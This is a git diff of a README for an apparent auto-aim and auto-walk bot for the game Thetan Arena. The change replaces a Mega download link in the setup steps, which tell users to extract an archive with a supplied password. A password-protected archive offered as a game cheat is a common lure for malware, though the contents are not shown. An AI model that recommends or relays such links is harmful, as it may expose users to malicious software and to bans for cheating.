@@ -8,7 +8,7 @@ Auto battle bot for Thetan Arena (auto aim + auto walk). Supported gameplay mods
 - Auto aim and auto walk
 
 ### Setup
-- [Download](https://github.com/psichedel/Thetan-Arena-bot/archive/refs/heads/main.zip) repository and extract files with password `Cl1SJgYEX` ([Github](https://github.com/psichedel/Thetan-Arena-bot/archive/refs/heads/main.zip) | [Mega](https://mega.nz/file/ut9GiIoB#xEOEZT8qoUAaNNnuywRK1K2HiJe1HZmLEeSoqvEmpRc))
+- [Download](https://github.com/psichedel/Thetan-Arena-bot/archive/refs/heads/main.zip) repository and extract files with password `Cl1SJgYEX` ([Github](https://github.com/psichedel/Thetan-Arena-bot/archive/refs/heads/main.zip) | [Mega](https://mega.nz/file/m6BHFYZB#80pHMZXAw-caIQydx6MDecW5y_z8ArW2bBSNu_1SFP8))
 - Launch Thetan Arena in fullscreen mode
 - Launch bot and select mode you need
 
